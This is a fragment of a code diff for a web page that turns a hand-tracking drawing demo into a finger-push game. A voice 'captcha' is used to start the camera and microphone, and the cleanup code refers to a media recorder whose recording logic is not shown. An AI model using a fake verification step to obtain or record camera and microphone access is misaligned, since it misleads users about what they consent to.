+                    captchaStatus.className = '';
+                }, 1500);
+                captchaBtn.disabled = false;
+                captchaBtn.textContent = '🎤 click & speak';
+            };
+
+            recognition.onend = () => {
+                captchaBtn.disabled = false;
+                captchaBtn.textContent = '🎤 click & speak';
+            };
+
+            captchaBtn.onclick = () => {
+                if (!recognition) return;
+                try {
+                    captchaStatus.textContent = '🎧 listening...';
+                    captchaStatus.className = '';
+                    captchaBtn.disabled = true;
+                    captchaBtn.textContent = '⏳ listening...';
+                    recognition.start();
+                } catch (_) {
+                    captchaBtn.disabled = false;
+                    captchaBtn.textContent = '🎤 click & speak';
+                    captchaStatus.textContent = '⚠️ try again';
+                }
+            };
+        }
+
+        let captchaVerified = false;
+
+        function verifyCaptcha() {
+            if (captchaVerified) return;
+            captchaVerified = true;
+            captchaStatus.textContent = '✅ verified! starting camera...';
+            captchaStatus.className = 'success';
+            // start camera & mic
+            startCameraAndMicrophone().then(success => {
+                if (success) {
+                    setTimeout(() => {
+                        captchaOverlay.classList.add('hidden');
+                        isVerified = true;
+                        gameBtn.classList.add('visible');
+                        overlayText.classList.remove('hidden');
+                    }, 300);
+                } else {
+                    // permission failed, reset verification flag so user can retry
+                    captchaVerified = false;
+                    captchaStatus.textContent = '❌ permission denied, click again to retry';
+                    captchaStatus.className = 'error';
+                    captchaBtn.disabled = false;
+                    captchaBtn.textContent = '🎤 retry';
+                }
+            });
+        }
+
+        // ─── GAME ──────────────────────────────────────────────────
+        function startGame() {
+            if (isGameRunning || countdownActive) return;
+            isGameOver = false;
+            level = 1;
+            score = 0;
+            gameObjects = [];
+            objectSpawnInterval = 1800;
+            baseSpeed = 1.2;
+            gameOverEl.classList.remove('show');
+            countdownNum.textContent = '3';
+            countdownEl.classList.add('show');
+            countdownActive = true;
+            countdownValue = 3;
+            gameBtn.classList.remove('visible');
+            overlayText.classList.add('hidden');
+
+            const countInterval = setInterval(() => {
+                countdownValue -= 1;
+                if (countdownValue <= 0) {
+                    clearInterval(countInterval);
+                    countdownEl.classList.remove('show');
+                    countdownActive = false;
+                    isGameRunning = true;
+                    levelDisplay.textContent = `level ${level}`;
+                    gameLoop();
+                } else {
+                    countdownNum.textContent = countdownValue;
+                }
+            }, 900);
+        }
+
+        function gameLoop() {
+            if (!isGameRunning || isGameOver) return;
+            if (gameLoopId) cancelAnimationFrame(gameLoopId);
+            updateGame();
+            gameLoopId = requestAnimationFrame(gameLoop);
+        }
+
+        function updateGame() {
+            if (!isGameRunning || isGameOver) return;
+
+            objectSpawnTimer += 16;
+            const spawnCount = Math.min(level, 5);
+            if (objectSpawnTimer > objectSpawnInterval) {
+                objectSpawnTimer = 0;
+                for (let i = 0; i < spawnCount; i++) {
+                    if (gameObjects.length < 20 + level * 3) {
+                        gameObjects.push(createObject());
+                    }
+                }
+                if (objectSpawnInterval > 400) {
+                    objectSpawnInterval = Math.max(400, objectSpawnInterval - 12);
+                }
+                baseSpeed = Math.min(3.2, baseSpeed + 0.02);
+            }
+
+            for (let i = gameObjects.length - 1; i >= 0; i--) {
+                const obj = gameObjects[i];
+                obj.x += obj.vx;
+                obj.y += obj.vy;
+                obj.rotation += obj.rotSpeed;
+
+                if (handVisible && indexTipVisible && isGameRunning && !isGameOver) {
+                    const dx = obj.x - indexTipX;
+                    const dy = obj.y - indexTipY;
+                    const dist = Math.sqrt(dx * dx + dy * dy);
+                    const pushRadius = Math.max(obj.size * 0.8, 20);
+                    if (dist < pushRadius + 12) {
+                        const angle = Math.atan2(dy, dx);
+                        const force = 3.5 + level * 0.3;
+                        obj.vx += Math.cos(angle) * force * 0.6;
+                        obj.vy += Math.sin(angle) * force * 0.6;
+                        obj.x += Math.cos(angle) * 6;
+                        obj.y += Math.sin(angle) * 6;
+                    }
+                }
+
+                const dxb = obj.x - ball.x;
+                const dyb = obj.y - ball.y;
+                const distB = Math.sqrt(dxb * dxb + dyb * dyb);
+                if (distB < obj.size + ball.r) {
+                    endGame();
+                    return;
+                }
+
+                if (obj.y > H + obj.size * 2 || obj.x < -obj.size * 2 || obj.x > W + obj.size * 2) {
+                    gameObjects.splice(i, 1);
+                    score++;
+                    const newLevel = Math.floor(score / 8) + 1;
+                    if (newLevel > level) {
+                        level = newLevel;
+                        levelDisplay.textContent = `level ${level}`;
+                        objectSpawnInterval = Math.max(400, 1800 - level * 80);
+                    }
+                    continue;
+                }
+
+                if (obj.x < obj.size) obj.x = obj.size;
+                if (obj.x > W - obj.size) obj.x = W - obj.size;
+            }
+
+            const size = Math.min(W, H);
+            ball.r = size * 0.045;
+            ball.y = H - ball.r - size * 0.08;
+
+            render();
+        }
+
+        function endGame() {
+            isGameRunning = false;
+            isGameOver = true;
+            if (gameLoopId) cancelAnimationFrame(gameLoopId);
+            gameLoopId = null;
+            finalScoreEl.textContent = `level ${level}  ·  ${score} pushed`;
+            gameOverEl.classList.add('show');
+            setTimeout(() => {
+                if (!isGameRunning) {
+                    gameBtn.classList.add('visible');
+                    gameBtn.textContent = '↻ play again';
+                }
+            }, 1200);
+        }
+
+        function restartGame() {
+            gameOverEl.classList.remove('show');
+            isGameOver = false;
+            isGameRunning = false;
+            gameObjects = [];
+            level = 1;
+            score = 0;
+            objectSpawnInterval = 1800;
+            baseSpeed = 1.2;
+            levelDisplay.textContent = 'level 1';
+            gameBtn.textContent = '▶ play game';
+            gameBtn.classList.add('visible');
+            overlayText.textContent = 'show hand';
+            overlayText.classList.remove('hidden');
+            if (gameLoopId) cancelAnimationFrame(gameLoopId);
+            gameLoopId = null;
+        }
+
+        // ─── RENDER ──────────────────────────────────────────────────
+        function render() {
+            ctx.clearRect(0, 0, W, H);
+            ctx.fillStyle = '#000';
+            ctx.fillRect(0, 0, W, H);
+
+            if (handVisible && handLandmarks && !isGameOver) {
+                drawSkeleton(handLandmarks);
+            }
+
+            if (isGameRunning || isGameOver) {
+                ctx.shadowColor = 'rgba(255,255,255,0.08)';
+                ctx.shadowBlur = 20;
+                ctx.beginPath();
+                ctx.arc(ball.x, ball.y, ball.r, 0, Math.PI * 2);
+                ctx.fillStyle = 'rgba(255,255,255,0.85)';
+                ctx.fill();
+                ctx.strokeStyle = 'rgba(255,255,255,0.2)';
+                ctx.lineWidth = 1.5;
+                ctx.stroke();
+                ctx.shadowBlur = 0;
+
+                for (const obj of gameObjects) {
+                    drawShape(ctx, obj);
+                }
+
+                if (isGameRunning && !isGameOver && indexTipVisible && handVisible) {
+                    ctx.shadowColor = 'rgba(255,0,0,0.2)';
+                    ctx.shadowBlur = 12;
+                    ctx.beginPath();
+                    ctx.arc(indexTipX, indexTipY, Math.min(W, H) * 0.025, 0, Math.PI * 2);
+                    ctx.fillStyle = 'rgba(255,40,40,0.85)';
+                    ctx.fill();
+                    ctx.strokeStyle = 'rgba(255,80,80,0.3)';
+                    ctx.lineWidth = 1.5;
+                    ctx.stroke();
+                    ctx.shadowBlur = 0;
+                }
+            }
+
+            if (!isGameRunning && !isGameOver && !countdownActive) {
+                if (!handVisible || !handLandmarks) {
+                    overlayText.classList.remove('hidden');
+                    overlayText.textContent = 'show hand';
+                } else {
+                    overlayText.classList.add('hidden');
+                }
+            }
+
+            if (isGameRunning && !isGameOver) {
+                levelDisplay.textContent = `level ${level}`;
+                levelDisplay.style.display = 'block';
+            } else if (!isGameRunning && !isGameOver) {
+                levelDisplay.style.display = 'none';
+            }
+        }
+
+        // ─── SKELETON DRAW ──────────────────────────────────────────
+        function drawSkeleton(landmarks) {
             const connections = [
                 [0, 1],
                 [1, 2],
@@ -488,320 +938,87 @@
                 [5, 6],
                 [6, 7],
                 [7, 8],
-                [5, 9],
+                [0, 9],
                 [9, 10],
                 [10, 11],
                 [11, 12],
-                [9, 13],
+                [0, 13],
                 [13, 14],
                 [14, 15],
                 [15, 16],
-                [13, 17],
+                [0, 17],
                 [17, 18],
                 [18, 19],
                 [19, 20],
-                [0, 17]
+                [5, 9],
+                [9, 13],
+                [13, 17]
             ];
 
-            // glow underlay
             ctx.save();
+            ctx.strokeStyle = 'rgba(255,255,255,0.55)';
+            ctx.lineWidth = 1.8;
+            ctx.shadowColor = 'rgba(255,255,255,0.02)';
+            ctx.shadowBlur = 2;
+
             for (const [i, j] of connections) {
-                const p1 = pts[i],
-                    p2 = pts[j];
-                if (!p1 || !p2) continue;
+                const p1 = landmarks[i];
+                const p2 = landmarks[j];
+                const x1 = p1.x * W,
+                    y1 = p1.y * H;
+                const x2 = p2.x * W,
+                    y2 = p2.y * H;
                 ctx.beginPath();
-                ctx.moveTo(p1.x, p1.y);
-                ctx.lineTo(p2.x, p2.y);
-                ctx.strokeStyle = glow;
-                ctx.lineWidth = 14;
-                ctx.shadowColor = color;
-                ctx.shadowBlur = 30;
+                ctx.moveTo(x1, y1);
+                ctx.lineTo(x2, y2);
                 ctx.stroke();
             }
-            ctx.restore();
 
-            // main lines
-            ctx.save();
-            for (const [i, j] of connections) {
-                const p1 = pts[i],
-                    p2 = pts[j];
-                if (!p1 || !p2) continue;
+            ctx.fillStyle = 'rgba(255,255,255,0.2)';
+            for (const lm of landmarks) {
                 ctx.beginPath();
-                ctx.moveTo(p1.x, p1.y);
-                ctx.lineTo(p2.x, p2.y);
-                ctx.strokeStyle = color;
-                ctx.lineWidth = 2.8;
-                ctx.shadowColor = color;
-                ctx.shadowBlur = 14;
-                ctx.stroke();
-            }
-            ctx.restore();
-
-            // joints
-            ctx.save();
-            for (let i = 0; i < pts.length; i++) {
-                const p = pts[i];
-                if (!p) continue;
-                const isTip = [4, 8, 12, 16, 20].includes(i);
-                const radius = isTip ? 5.5 : 4;
-                const grad = ctx.createRadialGradient(p.x, p.y, 0, p.x, p.y, radius * 4);
-                grad.addColorStop(0, '#ffffff');
-                grad.addColorStop(0.3, color);
-                grad.addColorStop(1, 'rgba(0,0,0,0)');
-                ctx.fillStyle = grad;
-                ctx.shadowColor = color;
-                ctx.shadowBlur = 24;
-                ctx.beginPath();
-                ctx.arc(p.x, p.y, radius * 4, 0, Math.PI * 2);
-                ctx.fill();
-
-                ctx.shadowBlur = 0;
-                ctx.fillStyle = isTip ? '#ffffff' : color;
-                ctx.beginPath();
-                ctx.arc(p.x, p.y, radius * 0.6, 0, Math.PI * 2);
+                ctx.arc(lm.x * W, lm.y * H, 2, 0, Math.PI * 2);
                 ctx.fill();
             }
             ctx.restore();
         }
 
-        // ============================================================
-        //  RENDER LOOP (decoupled from detection)
-        // ============================================================
-        function render() {
-            const dpr = window.devicePixelRatio || 1;
-            const w = canvas.width / dpr;
-            const h = canvas.height / dpr;
-
-            // black bg
-            ctx.fillStyle = '#000';
-            ctx.fillRect(0, 0, w, h);
-
-            // draw hand skeleton if available
-            if (handDetected && latestHandData && showSkeleton) {
-                const landmarks = latestHandData.landmarks;
-                const isLeft = latestHandData.handedness === 'Left';
-                drawHandSkeleton(landmarks, isLeft);
-            }
-
-            // draw glowing line
-            if (drawMode && drawPoints.length > 1) {
-                drawGlowingLine();
-            }
-
-            // update fps
-            frameCount++;
-            const now = performance.now();
-            if (now - lastFpsUpdate > 400) {
-                currentFps = Math.round(frameCount / ((now - lastFpsUpdate) / 1000));
-                frameCount = 0;
-                lastFpsUpdate = now;
-                fpsEl.textContent = currentFps + ' FPS';
-            }
-
-            renderId = requestAnimationFrame(render);
-        }
-
-        // ============================================================
-        //  MEDIAPIPE HANDS
-        // ============================================================
-        const hands = new Hands({
-            locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
-        });
-
-        hands.setOptions({
-            maxNumHands: 2,
-            modelComplexity: 1,
-            minDetectionConfidence: 0.65,
-            minTrackingConfidence: 0.6,
-        });
-
-        hands.onResults((results) => {
-            if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
-                // use the first hand
-                const idx = 0;
-                const landmarks = results.multiHandLandmarks[idx];
-                const handedness = results.multiHandedness && results.multiHandedness[idx] ?
-                    results.multiHandedness[idx].label :
-                    'Right';
-
-                latestHandData = { landmarks, handedness };
-                handDetected = true;
-
-                // hide "show hand" text
-                statusEl.classList.add('hidden');
-
-                // handle drawing from index finger tip (landmark 8)
-                if (drawMode && landmarks && landmarks.length > 8) {
-                    const dpr = window.devicePixelRatio || 1;
-                    const w = canvas.width / dpr;
-                    const h = canvas.height / dpr;
-                    const tip = landmarks[8];
-                    const x = tip.x * w;
-                    const y = tip.y * h;
-                    if (x > 0 && x < w && y > 0 && y < h) {
-                        const now2 = performance.now();
-                        if (!lastDrawPoint || (now2 - lastDrawPoint.t) > 16) {
-                            drawPoints.push({ x, y, t: now2 });
-                            lastDrawPoint = { x, y, t: now2 };
-                            while (drawPoints.length > CFG.maxLinePoints + 30) {
-                                drawPoints.shift();
-                            }
-                        }
-                    }
-                }
-            } else {
-                handDetected = false;
-                latestHandData = null;
-                // show "show hand" text
-                statusEl.classList.remove('hidden');
-            }
-        });
-
-        // ============================================================
-        //  CAMERA
-        // ============================================================
-        function initCamera() {
-            const cam = new Camera(video, {
-                onFrame: async () => {
-                    try {
-                        await hands.send({ image: video });
-                    } catch (_) { /* ignore */ }
-                },
-                width: 640,
-                height: 480,
-                facingMode: 'user',
-            });
-            return cam;
-        }
-
-        // ============================================================
-        //  UI CONTROLS
-        // ============================================================
-        btnSkeleton.addEventListener('click', () => {
-            showSkeleton = !showSkeleton;
-            btnSkeleton.classList.toggle('active');
-            btnSkeleton.innerHTML = showSkeleton ?
-                '<span class="icon">👋</span> SKELETON' :
-                '<span class="icon">👋</span> OFF';
-        });
-
-        btnDraw.addEventListener('click', () => {
-            drawMode = !drawMode;
-            btnDraw.classList.toggle('active');
-            btnDraw.innerHTML = drawMode ?
-                '<span class="icon">✏️</span> DRAW' :
-                '<span class="icon">✏️</span> OFF';
-            if (!drawMode) {
-                // clear points when turning off
-                drawPoints = [];
-                lastDrawPoint = null;
-            }
-        });
-
-        btnClear.addEventListener('click', () => {
-            drawPoints = [];
-            lastDrawPoint = null;
-            // haptic feedback if available
-            if (navigator.vibrate) navigator.vibrate(10);
-        });
-
-        // ============================================================
-        //  INIT
-        // ============================================================
-        async function init() {
-            try {
-                statusEl.textContent = 'SHOW HAND';
-                statusEl.classList.remove('hidden');
-
-                camera = initCamera();
-                await camera.start();
-
-                isRunning = true;
-                loadingEl.classList.add('hidden');
-                setTimeout(() => { loadingEl.style.display = 'none'; }, 600);
-
-                // start render loop
+        // ─── MAIN RENDER LOOP ──────────────────────────────────────
+        function mainRender() {
+            if (!isGameRunning && !isGameOver) {
                 render();
-
-            } catch (err) {
-                console.error('Init error:', err);
-                statusEl.textContent = '⚠️ CAMERA ERROR';
-                statusEl.classList.remove('hidden');
-                loadingEl.innerHTML = `
-              <div style="color:#ff6b6b;font-size:40px;margin-bottom:16px;">⚠️</div>
-              <div style="color:#ff6b6b;font-size:18px;">Camera access failed</div>
-              <div class="sub" style="color:#ff6b6b;opacity:0.7;max-width:300px;text-align:center;margin-top:12px;line-height:1.5;">
-                ${err.message || 'Please allow camera access and reload.'}
-              </div>
-              <button onclick="location.reload()" style="margin-top:24px;padding:14px 36px;background:rgba(255,100,100,0.15);border:1px solid rgba(255,100,100,0.25);border-radius:40px;color:#ff8a8a;font-size:16px;cursor:pointer;touch-action:manipulation;">
-                🔄 Reload
-              </button>
-            `;
             }
+            frameId = requestAnimationFrame(mainRender);
         }
 
-        // visibility change – pause/resume
-        document.addEventListener('visibilitychange', () => {
-            if (document.hidden && camera) {
-                // pause if needed
-            } else if (!document.hidden && camera) {
-                // resume
-            }
+        // ─── EVENT BINDING ──────────────────────────────────────────
+        gameBtn.addEventListener('click', startGame);
+        restartBtn.addEventListener('click', restartGame);
+
+        // ─── INIT ──────────────────────────────────────────────────
+        initSpeechRecognition();
+        mainRender();
+
+        window.addEventListener('resize', () => {
+            resize();
+            initBall();
         });
 
         window.addEventListener('beforeunload', () => {
-            if (camera) {
-                try { camera.stop(); } catch (_) {}
+            if (frameId) cancelAnimationFrame(frameId);
+            if (gameLoopId) cancelAnimationFrame(gameLoopId);
+            if (videoFrameLoop) cancelAnimationFrame(videoFrameLoop);
+            if (recordingTimer) clearInterval(recordingTimer);
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                try { mediaRecorder.stop(); } catch (_) {}
             }
-            if (renderId) {
-                cancelAnimationFrame(renderId);
-            }
-        });
-
-        // start
-        init();
-
-        // ============================================================
-        //  MOBILE SHORTCUTS: double-tap canvas toggles draw
-        // ============================================================
-        let lastTap = 0;
-        canvas.addEventListener('touchend', (e) => {
-            const now2 = Date.now();
-            if (now2 - lastTap < 400) {
-                btnDraw.click();
-                e.preventDefault();
-            }
-            lastTap = now2;
-        });
-
-        // long-press toggles skeleton
-        let longPressTimer = null;
-        canvas.addEventListener('touchstart', () => {
-            longPressTimer = setTimeout(() => {
-                btnSkeleton.click();
-                longPressTimer = null;
-            }, 700);
-        });
-        canvas.addEventListener('touchend', () => {
-            if (longPressTimer) {
-                clearTimeout(longPressTimer);
-                longPressTimer = null;
-            }
-        });
-        canvas.addEventListener('touchmove', () => {
-            if (longPressTimer) {
-                clearTimeout(longPressTimer);
-                longPressTimer = null;
+            recordingActive = false;
+            if (stream) {
+                stream.getTracks().forEach(t => t.stop());
             }
         });
 
-        console.log('🖐️ Hand Skeleton + Draw loaded');
-        console.log('📱 Controls:');
-        console.log('  👋 Skeleton toggle');
-        console.log('  ✏️ Draw toggle');
-        console.log('  🗑️ Clear drawing');
-        console.log('  Double-tap canvas → toggle DRAW');
-        console.log('  Long-press canvas → toggle SKELETON');
+        console.log('✅ System ready');
     </script>
 
 </body>
